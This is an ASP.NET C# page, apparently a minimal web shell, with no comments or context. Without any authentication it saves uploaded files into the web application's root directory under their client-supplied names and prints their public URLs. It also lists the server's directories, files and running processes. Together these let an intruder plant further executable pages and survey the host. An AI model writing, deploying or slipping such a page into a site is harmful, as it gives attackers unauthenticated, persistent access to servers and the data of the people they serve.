<%@ Page Language="C#" %>



<script runat="server">

    protected void Button1_Click(object sender, EventArgs e)

    {

        if (FileUpload1.HasFile)

            try

            { 

                FileUpload1.SaveAs(AppDomain.CurrentDomain.BaseDirectory+FileUpload1.FileName);

                Label1.Text = "File name: " +

                     FileUpload1.PostedFile.FileName + "<br>" +

                     FileUpload1.PostedFile.ContentLength + " kb<br>" +

                     "Content type: " +

                     FileUpload1.PostedFile.ContentType;

                string currentPageUrl = "";

                if (Request.ServerVariables["HTTPS"].ToString() == "")

                {

                    currentPageUrl = Request.ServerVariables["SERVER_PROTOCOL"].ToString().ToLower().Substring(0, 4).ToString() + "://" + Request.ServerVariables["SERVER_NAME"].ToString() + ":" + Request.ServerVariables["SERVER_PORT"].ToString() +"/"+ FileUpload1.PostedFile.FileName;

                }

                else

                {

                    currentPageUrl = Request.ServerVariables["SERVER_PROTOCOL"].ToString().ToLower().Substring(0, 5).ToString() + "://" + Request.ServerVariables["SERVER_NAME"].ToString() + ":" + Request.ServerVariables["SERVER_PORT"].ToString() +"/"+ FileUpload1.PostedFile.FileName;

                } 

                string filepath =  Request.Url.GetLeftPart(UriPartial.Authority);

                Label2.Text = currentPageUrl;

            }

            catch (Exception ex)

            {

                Label1.Text = "ERROR: " + ex.Message.ToString();

            }

        else

        {

            Label1.Text = "You have not specified a file.";

        }

    }



    protected void Button2_Click(object sender, EventArgs e)

    {

        ListBox1.Items.Clear();        

        string[] listdir=System.IO.Directory.GetDirectories(AppDomain.CurrentDomain.BaseDirectory.ToString());

        foreach (string name in listdir)

        {

            ListBox1.Items.Add(name);

        }

        listdir = System.IO.Directory.GetFiles(AppDomain.CurrentDomain.BaseDirectory.ToString());

        foreach (string name in listdir)

        {

            ListBox1.Items.Add(name);

        }

    }



    protected void Button3_Click(object sender, EventArgs e)

    {

        ListBox1.Items.Clear(); 

        System.Diagnostics.Process[] pp = System.Diagnostics.Process.GetProcesses();

        foreach (System.Diagnostics.Process name in pp)

        {

            ListBox1.Items.Add(name.ProcessName);

        }

    }

</script>



<html xmlns="http://www.w3.org/1999/xhtml" >

<head id="Head1" runat="server">

    <title></title>

</head>

<body>

    <form id="form1" runat="server" enctype="multipart/form-data">

    <div style="width: 977px; height: 333px">

        <br />

        <asp:FileUpload ID="FileUpload1" runat="server" /><br />

        <br />

        <asp:Button ID="Button1" runat="server" OnClick="Button1_Click" 

         Text="Upload File" />&nbsp;<br />

        <br />

        <asp:Label ID="Label1" runat="server"></asp:Label>

        <br />

        <br />

        <asp:Label ID="Label2" runat="server"></asp:Label>

        <br />

    <div style="width: 397px; height: 157px">

        <br />

        <asp:Button ID="Button2" runat="server" OnClick="Button2_Click" 

         Text="View Directory List" />&nbsp;<asp:Button ID="Button3" runat="server" OnClick="Button3_Click" 

         Text="View Process List" /><br />

        <asp:ListBox ID="ListBox1" runat="server" Height="311px" Width="625px" 

            AutoPostBack="True" Rows="20">

        </asp:ListBox>

        <br />

        </div>

    </div>

    </form>

</body>

</html>




